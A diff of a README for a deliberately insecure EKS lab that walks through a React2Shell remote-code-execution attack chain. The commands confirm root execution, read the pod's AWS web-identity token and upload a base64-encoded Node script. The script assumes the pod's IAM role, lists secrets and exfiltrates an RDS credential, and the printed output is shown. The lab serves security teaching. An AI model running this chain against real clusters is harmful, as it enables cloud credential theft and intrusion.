@@ -1,8 +1,8 @@
-# reat2shell: EKS
+# reat2shell: Insecure EKS
 
 [Back](../README.md)
 
-- [reat2shell: EKS](#reat2shell-eks)
+- [reat2shell: Insecure EKS](#reat2shell-insecure-eks)
   - [Goal](#goal)
   - [Infra Design](#infra-design)
     - [Key Misconfigs](#key-misconfigs)
@@ -12,7 +12,6 @@
   - [Breach](#breach)
     - [Attack Chain](#attack-chain)
     - [Attack Steps](#attack-steps)
-  - [Commands](#commands)
 
 ---
 
@@ -22,11 +21,6 @@
    - `eks-insecure`
 2. Create cloud crown jewel — the **RDSsecret in Secrets Manager**.
 3. Deploy using `GitOps`
-   - deploy insecure applications
-   - deploy supporting app
-     - cert-manager: enable tls
-     - e-dns: expose with dns
-   - expose app on dns `react2shell-insecure.arguswatcher.net`
 
 ---
 
@@ -107,7 +101,7 @@ kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.pas
 # port forward
 kubectl port-forward service/argocd-server -n argocd 8443:443
 
-kubectl apply -f argocd/root-app-insecure.yaml
+kubectl apply -f argocd/insecure-root-app.yaml
 ```
 
 ---
@@ -127,42 +121,41 @@ React2Shell RCE in pod
 
 ### Attack Steps
 
-| #   | Step              | What                                                | Expected result                 |
-| --- | ----------------- | --------------------------------------------------- | ------------------------------- |
-| 1   | Confirm RCE       | Run `id` via the React2Shell exploit                | Code exec on the pod            |
-| 2   | Detect IRSA       | Read `AWS_ROLE_ARN` / web-identity token env vars   | Pod has an AWS identity         |
-| 3   | No CLI            | `aws ...` → not found; stage a Node exploit instead | Attacker uses what's on the box |
-| 4   | **Grab jewel**    | `steal_secret.js`: assume-role → GetSecretValue     | 🪙 RDS secret exfiltrated       |
-| 5   | Show blast radius | `steal_secret.js --list`: ListSecrets via `*/*`     | Lists secrets beyond its own    |
+| #   | Step             | What                                                | Expected result                 |
+| --- | ---------------- | --------------------------------------------------- | ------------------------------- |
+| 1   | Confirm RCE      | Run `id` via the React2Shell exploit                | Code exec on the pod            |
+| 2   | Detect IRSA      | Read `AWS_ROLE_ARN` / web-identity token env vars   | Pod has an AWS identity         |
+| 3   | Upload script    | `aws ...` → not found; stage a Node exploit instead | Attacker uses what's on the box |
+| 4   | get blast radius | `steal_secret.js --list`: ListSecrets via `*/*`     | Lists secrets beyond its own    |
+| 5   | **Grab jewel**   | `steal_secret.js`: assume-role → GetSecretValue     | 🪙 RDS secret exfiltrated       |
 
 **Milestone:** cloud-level crown jewel retrieved
 
 ---
 
-## Commands
-
-- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`. Exploit via `scripts/rce.py`.
-- Precondition: the pod must be restarted after the IRSA annotation so the
-  projected AWS token is injected.
+- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`.
+- Exploit via `scripts/rce.py`.
 
 ```sh
 # restart the pod to pick up the IRSA token
 kubectl rollout restart deploy/react2shell -n insecure-frontend
 
-# forward
+# port forward
 kubectl port-forward service/react2shell -n insecure-frontend 3000:3000
 
 vi /etc/hosts
-```
+# 127.0.0.1 react2shell-insecure.arguswatcher.net
 
-```sh
-# 1. confirm RCE
+# ##############################
+# Attack
+# ##############################
+# 1. confirm RCE by id
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
 # uid=0(root) gid=0(root) groups=0(root)
 
 # 2. detect IRSA — pod has an AWS identity
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
-# AWS_ROLE_ARN=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa
+# AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
 # AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
 # AWS_STS_REGIONAL_ENDPOINTS=regional
 # AWS_DEFAULT_REGION=ca-central-1
@@ -173,27 +166,23 @@ python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "cat \$
 executable response:
 # eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...
 
-# 3. no aws CLI in the image — the SDK path is unavailable
+# try aws CLI
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "aws sts get-caller-identity"
 # /bin/sh: 1: aws: not found
 
-# 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
-#    steal_secret.js: read IRSA token -> STS AssumeRoleWithWebIdentity
-#    -> Secrets Manager GetSecretValue (hand-rolled SigV4).
+# 3. upload js
 b64=$(base64 -w0 scripts/steal_secret.js)
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"
 
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-dev-rds-credential"
-# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 secret=react2shell-eks-dev-rds-credential
-# [*] assumed role, akid=ASIAROFJQB4XPM3B6R34
-# {"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081673E9,"Name":"react2shell-eks-dev-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv","VersionStages":["AWSCURRENT"]}
-
-
-# 5. blast radius — the */* role lists secrets, not just its own
-#    (re-stage /tmp/s.js first if steal_secret.js changed)
+# 4. blast radius: the */* role lists secrets
 python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
-# executable response:
-# [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 mode=list
-# [*] assumed role, akid=ASIAROFJQB4XIGNCE43C
-# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081357E9,"Description":"RDS master credential (crown jewel for the lab).","LastAccessedDate":1.791504E9,"LastChangedDate":1.791514081676E9,"Name":"react2shell-eks-dev-rds-credential","SecretVersionsToStages":{"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"dev"},{"Key":"ManagedBy","Value":"terraform"}]}]}
+# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
+# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606357E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7921088E9,"LastChangedDate":1.792173606666E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-mb3RtAygQ7r01zMpAb4UulrH4x":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}
+
+# 5. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
+# steal_secret.js:
+# read IRSA token -> STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"
+# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=get secret=react2shell-eks-insecure-rds-credential
+# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606659E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-mb3RtAygQ7r01zMpAb4UulrH4x","VersionStages":["AWSCURRENT"]}
 ```
